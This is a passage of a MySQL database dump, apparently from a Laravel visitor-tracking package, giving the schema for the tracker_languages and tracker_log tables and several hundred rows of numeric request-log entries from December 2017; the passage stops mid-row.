/*!40000 ALTER TABLE `tracker_geoip` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_languages`
--

DROP TABLE IF EXISTS `tracker_languages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_languages` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `preference` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `language-range` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `tracker_languages_preference_language_range_unique` (`preference`,`language-range`),
  KEY `tracker_languages_preference_index` (`preference`),
  KEY `tracker_languages_language_range_index` (`language-range`),
  KEY `tracker_languages_created_at_index` (`created_at`),
  KEY `tracker_languages_updated_at_index` (`updated_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_languages`
--

LOCK TABLES `tracker_languages` WRITE;
/*!40000 ALTER TABLE `tracker_languages` DISABLE KEYS */;
/*!40000 ALTER TABLE `tracker_languages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_log`
--

DROP TABLE IF EXISTS `tracker_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_log` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `session_id` bigint(20) unsigned NOT NULL,
  `path_id` bigint(20) unsigned DEFAULT NULL,
  `query_id` bigint(20) unsigned DEFAULT NULL,
  `method` varchar(10) COLLATE utf8_unicode_ci NOT NULL,
  `route_path_id` bigint(20) unsigned DEFAULT NULL,
  `is_ajax` tinyint(1) NOT NULL,
  `is_secure` tinyint(1) NOT NULL,
  `is_json` tinyint(1) NOT NULL,
  `wants_json` tinyint(1) NOT NULL,
  `error_id` bigint(20) unsigned DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `referer_id` int(10) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `tracker_log_session_id_index` (`session_id`),
  KEY `tracker_log_path_id_index` (`path_id`),
  KEY `tracker_log_query_id_index` (`query_id`),
  KEY `tracker_log_method_index` (`method`),
  KEY `tracker_log_route_path_id_index` (`route_path_id`),
  KEY `tracker_log_error_id_index` (`error_id`),
  KEY `tracker_log_created_at_index` (`created_at`),
  KEY `tracker_log_updated_at_index` (`updated_at`),
  KEY `tracker_log_referer_id_index` (`referer_id`),
  CONSTRAINT `tracker_log_error_id_foreign` FOREIGN KEY (`error_id`) REFERENCES `tracker_errors` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_log_path_id_foreign` FOREIGN KEY (`path_id`) REFERENCES `tracker_paths` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_log_query_id_foreign` FOREIGN KEY (`query_id`) REFERENCES `tracker_queries` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_log_route_path_id_foreign` FOREIGN KEY (`route_path_id`) REFERENCES `tracker_route_paths` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `tracker_log_session_id_foreign` FOREIGN KEY (`session_id`) REFERENCES `tracker_sessions` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=1002 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_log`
--

LOCK TABLES `tracker_log` WRITE;
/*!40000 ALTER TABLE `tracker_log` DISABLE KEYS */;
INSERT INTO `tracker_log` VALUES (1,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 10:50:42','2017-12-26 10:50:42',1),(2,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 10:53:21','2017-12-26 10:53:21',1),(3,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:09:41','2017-12-26 11:09:41',1),(4,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:13:32','2017-12-26 11:13:32',1),(5,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:14:11','2017-12-26 11:14:11',1),(6,2,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:15:20','2017-12-26 11:15:20',NULL),(7,1,1,NULL,'GET',1,0,0,0,0,2,'2017-12-26 11:19:43','2017-12-26 11:19:43',1),(8,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:20:05','2017-12-26 11:20:05',1),(9,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:22:32','2017-12-26 11:22:32',1),(10,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:23:13','2017-12-26 11:23:13',1),(11,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:23:55','2017-12-26 11:23:55',1),(12,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:26:54','2017-12-26 11:26:54',1),(13,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:26:59','2017-12-26 11:26:59',1),(14,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:27:08','2017-12-26 11:27:08',1),(15,1,1,NULL,'GET',1,0,0,0,0,3,'2017-12-26 11:28:55','2017-12-26 11:28:55',1),(16,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:29:20','2017-12-26 11:29:20',1),(17,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:29:41','2017-12-26 11:29:41',1),(18,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:29:50','2017-12-26 11:29:50',1),(19,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:30:20','2017-12-26 11:30:20',1),(20,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:31:31','2017-12-26 11:31:31',1),(21,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:31:55','2017-12-26 11:31:55',1),(22,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:32:02','2017-12-26 11:32:02',1),(23,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:41:03','2017-12-26 11:41:03',1),(24,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:44:19','2017-12-26 11:44:19',1),(25,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:44:28','2017-12-26 11:44:28',1),(26,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:44:43','2017-12-26 11:44:43',1),(27,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:45:03','2017-12-26 11:45:03',1),(28,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:45:11','2017-12-26 11:45:11',1),(29,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:45:49','2017-12-26 11:45:49',1),(30,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:47:57','2017-12-26 11:47:57',1),(31,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:48:40','2017-12-26 11:48:40',1),(32,1,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 11:48:46','2017-12-26 11:48:46',1),(33,1,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 12:07:43','2017-12-26 12:07:43',2),(34,1,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 12:07:48','2017-12-26 12:07:48',2),(35,1,3,NULL,'GET',6,0,0,0,0,NULL,'2017-12-26 12:19:46','2017-12-26 12:19:46',NULL),(36,1,3,NULL,'GET',6,0,0,0,0,NULL,'2017-12-26 12:20:01','2017-12-26 12:20:01',NULL),(37,1,3,NULL,'GET',6,0,0,0,0,NULL,'2017-12-26 12:21:45','2017-12-26 12:21:45',NULL),(38,1,3,NULL,'GET',6,0,0,0,0,NULL,'2017-12-26 12:24:00','2017-12-26 12:24:00',NULL),(39,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:36:11','2017-12-26 12:36:11',NULL),(40,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:36:18','2017-12-26 12:36:18',3),(41,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:36:19','2017-12-26 12:36:19',3),(42,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:36:20','2017-12-26 12:36:20',3),(43,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:38:20','2017-12-26 12:38:20',4),(44,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:38:26','2017-12-26 12:38:26',5),(45,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:38:27','2017-12-26 12:38:27',5),(46,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:38:27','2017-12-26 12:38:27',5),(47,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:41:01','2017-12-26 12:41:01',4),(48,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:41:08','2017-12-26 12:41:08',5),(49,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:41:08','2017-12-26 12:41:08',5),(50,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:41:09','2017-12-26 12:41:09',5),(51,1,8,NULL,'GET',14,1,0,0,0,NULL,'2017-12-26 12:41:25','2017-12-26 12:41:25',5),(52,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:41:26','2017-12-26 12:41:26',5),(53,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:41:26','2017-12-26 12:41:26',5),(54,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:41:29','2017-12-26 12:41:29',5),(55,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:41:47','2017-12-26 12:41:47',5),(56,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:41:50','2017-12-26 12:41:50',5),(57,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:42:26','2017-12-26 12:42:26',4),(58,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:42:32','2017-12-26 12:42:32',5),(59,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:42:32','2017-12-26 12:42:32',5),(60,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:42:33','2017-12-26 12:42:33',5),(61,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:43:08','2017-12-26 12:43:08',4),(62,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:43:13','2017-12-26 12:43:13',5),(63,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:43:13','2017-12-26 12:43:13',5),(64,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:43:14','2017-12-26 12:43:14',5),(65,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:46:33','2017-12-26 12:46:33',4),(66,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:46:38','2017-12-26 12:46:38',6),(67,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:46:39','2017-12-26 12:46:39',6),(68,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:46:40','2017-12-26 12:46:40',6),(69,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:46:50','2017-12-26 12:46:50',4),(70,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:46:56','2017-12-26 12:46:56',6),(71,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:46:57','2017-12-26 12:46:57',6),(72,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:46:57','2017-12-26 12:46:57',6),(73,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:48:06','2017-12-26 12:48:06',4),(74,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:48:07','2017-12-26 12:48:07',6),(75,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:48:08','2017-12-26 12:48:08',6),(76,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:48:09','2017-12-26 12:48:09',6),(77,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:48:12','2017-12-26 12:48:12',6),(78,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:48:15','2017-12-26 12:48:15',6),(79,1,9,NULL,'POST',15,1,0,0,1,NULL,'2017-12-26 12:48:23','2017-12-26 12:48:23',6),(80,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:48:25','2017-12-26 12:48:25',6),(81,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:48:26','2017-12-26 12:48:26',6),(82,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:48:31','2017-12-26 12:48:31',6),(83,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:48:37','2017-12-26 12:48:37',6),(84,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:51:10','2017-12-26 12:51:10',NULL),(85,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:51:12','2017-12-26 12:51:12',3),(86,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:51:12','2017-12-26 12:51:12',3),(87,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:51:13','2017-12-26 12:51:13',3),(88,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 12:51:25','2017-12-26 12:51:25',4),(89,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 12:51:26','2017-12-26 12:51:26',6),(90,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 12:51:27','2017-12-26 12:51:27',6),(91,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 12:51:28','2017-12-26 12:51:28',6),(92,1,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 13:07:33','2017-12-26 13:07:33',4),(93,1,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 13:07:35','2017-12-26 13:07:35',6),(94,1,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 13:07:35','2017-12-26 13:07:35',6),(95,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 13:07:36','2017-12-26 13:07:36',6),(96,1,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 13:07:40','2017-12-26 13:07:40',6),(97,3,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 13:36:00','2017-12-26 10:06:00',7),(98,3,10,NULL,'POST',17,1,0,0,0,NULL,'2017-12-26 13:36:13','2017-12-26 10:06:13',8),(99,3,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 13:36:15','2017-12-26 10:06:15',7),(100,3,4,NULL,'GET',7,0,0,0,0,NULL,'2017-12-26 13:36:36','2017-12-26 10:06:36',9),(101,3,6,NULL,'GET',9,1,0,0,0,NULL,'2017-12-26 13:36:38','2017-12-26 10:06:38',10),(102,3,5,NULL,'GET',8,1,0,0,0,NULL,'2017-12-26 13:36:38','2017-12-26 10:06:38',10),(103,3,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 13:36:39','2017-12-26 10:06:39',10),(104,3,7,NULL,'GET',10,1,0,0,0,NULL,'2017-12-26 13:36:43','2017-12-26 10:06:43',10),(105,3,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 13:37:31','2017-12-26 10:07:31',7),(106,3,11,NULL,'POST',18,0,0,0,0,NULL,'2017-12-26 13:48:52','2017-12-26 10:18:52',9),(107,3,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 13:48:53','2017-12-26 10:18:53',9),(108,4,12,NULL,'GET',19,0,0,0,0,NULL,'2017-12-26 13:58:07','2017-12-26 10:28:07',NULL),(109,5,13,NULL,'GET',20,0,0,0,0,NULL,'2017-12-26 13:58:11','2017-12-26 10:28:11',NULL),(110,6,14,NULL,'GET',21,0,0,0,0,NULL,'2017-12-26 13:58:14','2017-12-26 10:28:14',NULL),(111,7,14,NULL,'GET',21,0,0,0,0,NULL,'2017-12-26 13:58:18','2017-12-26 10:28:18',NULL),(112,8,15,NULL,'GET',22,0,0,0,0,NULL,'2017-12-26 13:58:21','2017-12-26 10:28:21',NULL),(113,9,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 17:16:29','2017-12-26 13:46:29',NULL),(114,10,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-26 17:27:18','2017-12-26 13:57:18',NULL),(115,11,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-26 17:27:21','2017-12-26 13:57:21',NULL),(116,12,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-26 17:27:23','2017-12-26 13:57:23',NULL),(117,13,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 17:54:03','2017-12-26 14:24:03',NULL),(118,14,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 18:30:11','2017-12-26 15:00:11',NULL),(119,15,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 18:30:11','2017-12-26 15:00:11',NULL),(120,16,17,NULL,'GET',24,0,0,0,0,NULL,'2017-12-26 20:51:18','2017-12-26 17:21:18',NULL),(121,17,15,NULL,'GET',22,0,0,0,0,NULL,'2017-12-26 20:51:21','2017-12-26 17:21:21',NULL),(122,18,18,NULL,'GET',25,0,0,0,0,NULL,'2017-12-26 20:51:30','2017-12-26 17:21:30',NULL),(123,19,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 22:33:09','2017-12-26 19:03:09',NULL),(124,20,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 23:35:43','2017-12-26 20:05:43',NULL),(125,21,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 23:35:57','2017-12-26 20:05:57',NULL),(126,21,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-26 23:36:08','2017-12-26 20:06:08',NULL),(127,21,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 23:36:20','2017-12-26 20:06:20',NULL),(128,20,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-26 23:36:22','2017-12-26 20:06:22',NULL),(129,20,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 23:36:35','2017-12-26 20:06:35',NULL),(130,21,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-26 23:36:41','2017-12-26 20:06:41',NULL),(131,21,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-26 23:36:52','2017-12-26 20:06:52',NULL),(132,21,19,NULL,'GET',26,0,0,0,0,NULL,'2017-12-26 23:37:13','2017-12-26 20:07:13',NULL),(133,20,19,NULL,'GET',26,0,0,0,0,NULL,'2017-12-26 23:37:24','2017-12-26 20:07:24',NULL),(134,21,19,NULL,'GET',26,0,0,0,0,NULL,'2017-12-26 23:37:37','2017-12-26 20:07:37',NULL),(135,21,20,NULL,'GET',27,0,0,0,0,NULL,'2017-12-26 23:37:48','2017-12-26 20:07:48',NULL),(136,20,20,NULL,'GET',27,0,0,0,0,NULL,'2017-12-26 23:37:55','2017-12-26 20:07:55',NULL),(137,21,20,NULL,'GET',27,0,0,0,0,NULL,'2017-12-26 23:38:04','2017-12-26 20:08:04',NULL),(138,21,21,NULL,'GET',28,0,0,0,0,NULL,'2017-12-26 23:38:13','2017-12-26 20:08:13',NULL),(139,21,17,NULL,'GET',24,0,0,0,0,NULL,'2017-12-26 23:38:20','2017-12-26 20:08:20',NULL),(140,22,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 01:23:42','2017-12-26 21:53:42',NULL),(141,23,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-27 02:40:16','2017-12-26 23:10:16',NULL),(142,24,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 02:40:19','2017-12-26 23:10:19',NULL),(143,25,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 02:40:21','2017-12-26 23:10:21',NULL),(144,26,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 03:09:42','2017-12-26 23:39:42',NULL),(145,27,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 04:30:14','2017-12-27 01:00:14',NULL),(146,28,2,NULL,'HEAD',5,0,0,0,0,NULL,'2017-12-27 04:41:32','2017-12-27 01:11:32',NULL),(147,29,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 04:41:33','2017-12-27 01:11:33',NULL),(148,30,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 05:33:25','2017-12-27 02:03:25',11),(149,31,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 05:33:31','2017-12-27 02:03:31',12),(150,32,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 06:21:14','2017-12-27 02:51:14',NULL),(151,33,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 06:36:46','2017-12-27 03:06:46',13),(152,34,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 06:37:04','2017-12-27 03:07:04',13),(153,35,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 06:37:23','2017-12-27 03:07:23',13),(154,36,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 06:37:31','2017-12-27 03:07:31',13),(155,37,17,NULL,'GET',24,0,0,0,0,NULL,'2017-12-27 06:37:40','2017-12-27 03:07:40',13),(156,38,22,NULL,'GET',29,0,0,0,0,NULL,'2017-12-27 06:37:53','2017-12-27 03:07:53',13),(157,39,15,NULL,'GET',22,0,0,0,0,NULL,'2017-12-27 07:15:16','2017-12-27 03:45:16',14),(158,40,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 07:55:03','2017-12-27 04:25:03',NULL),(159,41,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 08:18:30','2017-12-27 04:48:30',NULL),(160,42,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 08:19:05','2017-12-27 04:49:05',NULL),(161,43,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 08:37:58','2017-12-27 05:07:58',15),(162,43,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 08:43:02','2017-12-27 05:13:02',15),(163,43,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 08:43:27','2017-12-27 05:13:27',15),(164,44,13,NULL,'GET',20,0,0,0,0,NULL,'2017-12-27 10:19:39','2017-12-27 06:49:39',NULL),(165,45,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 10:36:22','2017-12-27 07:06:22',11),(166,46,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 10:36:22','2017-12-27 07:06:22',12),(167,47,21,NULL,'GET',28,0,0,0,0,NULL,'2017-12-27 10:42:58','2017-12-27 07:12:58',NULL),(168,48,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 11:07:52','2017-12-27 07:37:52',NULL),(169,49,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 11:22:35','2017-12-27 07:52:35',16),(170,49,22,NULL,'GET',29,0,0,0,0,NULL,'2017-12-27 11:24:14','2017-12-27 07:54:14',17),(171,49,17,NULL,'GET',24,0,0,0,0,NULL,'2017-12-27 11:24:15','2017-12-27 07:54:15',17),(172,49,19,NULL,'GET',26,0,0,0,0,NULL,'2017-12-27 11:24:17','2017-12-27 07:54:17',17),(173,49,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 11:24:18','2017-12-27 07:54:18',17),(174,49,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 11:29:39','2017-12-27 07:59:39',18),(175,49,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-27 11:29:41','2017-12-27 07:59:41',18),(176,49,23,NULL,'GET',30,0,0,0,0,NULL,'2017-12-27 11:29:42','2017-12-27 07:59:42',18),(177,49,21,NULL,'GET',28,0,0,0,0,NULL,'2017-12-27 11:29:43','2017-12-27 07:59:43',18),(178,49,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 11:29:44','2017-12-27 07:59:44',18),(179,49,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 11:29:45','2017-12-27 07:59:45',18),(180,49,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 11:29:47','2017-12-27 07:59:47',18),(181,49,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 11:29:48','2017-12-27 07:59:48',18),(182,49,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 11:29:49','2017-12-27 07:59:49',18),(183,49,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 11:29:51','2017-12-27 07:59:51',18),(184,49,18,NULL,'GET',25,0,0,0,0,NULL,'2017-12-27 11:29:54','2017-12-27 07:59:54',19),(185,49,20,NULL,'GET',27,0,0,0,0,NULL,'2017-12-27 11:29:55','2017-12-27 07:59:55',19),(186,49,14,NULL,'GET',21,0,0,0,0,NULL,'2017-12-27 11:29:56','2017-12-27 07:59:56',19),(187,49,15,NULL,'GET',22,0,0,0,0,NULL,'2017-12-27 11:29:58','2017-12-27 07:59:58',19),(188,49,13,NULL,'GET',20,0,0,0,0,NULL,'2017-12-27 11:29:59','2017-12-27 07:59:59',19),(189,49,12,NULL,'GET',19,0,0,0,0,NULL,'2017-12-27 11:30:00','2017-12-27 08:00:00',19),(190,49,24,NULL,'GET',31,0,0,0,0,NULL,'2017-12-27 11:30:02','2017-12-27 08:00:02',19),(191,50,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 11:52:21','2017-12-27 08:22:21',NULL),(192,51,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 11:58:22','2017-12-27 08:28:22',NULL),(193,52,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 12:16:08','2017-12-27 08:46:08',NULL),(194,53,25,NULL,'GET',32,0,0,0,0,NULL,'2017-12-27 12:27:35','2017-12-27 08:57:35',NULL),(195,53,25,NULL,'POST',33,0,0,0,0,NULL,'2017-12-27 12:27:41','2017-12-27 08:57:41',20),(196,53,11,NULL,'POST',18,0,0,0,0,NULL,'2017-12-27 12:27:47','2017-12-27 08:57:47',21),(197,53,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 12:27:48','2017-12-27 08:57:48',21),(198,54,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 15:21:15','2017-12-27 11:51:15',NULL),(199,55,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 17:36:19','2017-12-27 14:06:19',12),(200,56,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-27 17:36:52','2017-12-27 14:06:52',11),(201,57,22,NULL,'GET',29,0,0,0,0,NULL,'2017-12-27 19:07:08','2017-12-27 15:37:08',NULL),(202,58,22,NULL,'GET',29,0,0,0,0,NULL,'2017-12-27 19:44:01','2017-12-27 16:14:01',NULL),(203,59,1,NULL,'GET',1,0,0,0,0,NULL,'2017-12-27 23:21:16','2017-12-27 19:51:16',NULL),(204,60,23,NULL,'GET',30,0,0,0,0,NULL,'2017-12-27 23:22:41','2017-12-27 19:52:41',NULL),(205,61,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 23:42:35','2017-12-27 20:12:35',NULL),(206,62,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-27 23:44:56','2017-12-27 20:14:56',NULL),(207,63,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-28 00:24:44','2017-12-27 20:54:44',NULL),(208,64,25,NULL,'GET',32,0,0,0,0,NULL,'2017-12-28 00:58:45','2017-12-27 21:28:45',NULL),(209,65,19,NULL,'GET',26,0,0,0,0,NULL,'2017-12-28 01:03:19','2017-12-27 21:33:19',NULL),(210,66,21,NULL,'GET',28,0,0,0,0,NULL,'2017-12-28 02:46:18','2017-12-27 23:16:18',NULL),(211,67,23,NULL,'GET',30,0,0,0,0,NULL,'2017-12-28 02:46:21','2017-12-27 23:16:21',NULL),(212,68,23,NULL,'GET',30,0,0,0,0,NULL,'2017-12-28 02:46:27','2017-12-27 23:16:27',NULL),(213,69,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-28 03:10:25','2017-12-27 23:40:25',NULL),(214,70,16,NULL,'GET',23,0,0,0,0,NULL,'2017-12-28 05:13:44','2017-12-28 01:43:44',NULL),(215,71,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-28 06:42:02','2017-12-28 03:12:02',NULL),(216,72,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-28 06:49:31','2017-12-28 03:19:31',NULL),(217,73,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-28 07:19:46','2017-12-28 03:49:46',12),(218,74,2,NULL,'GET',5,0,0,0,0,NULL,'2017-12-28 08:02:20','2017-12-28 04:32:20',NULL),(219,75,17,NULL,'GET',24,0,0,0,0,NULL,'2017-12-28 08:02:23','2017-12-28 04:32:23',NULL),(220,76,19,NULL,'GET',26,0,0,0,0,NULL,'2017-12-28 08:02:27','2017-12-28 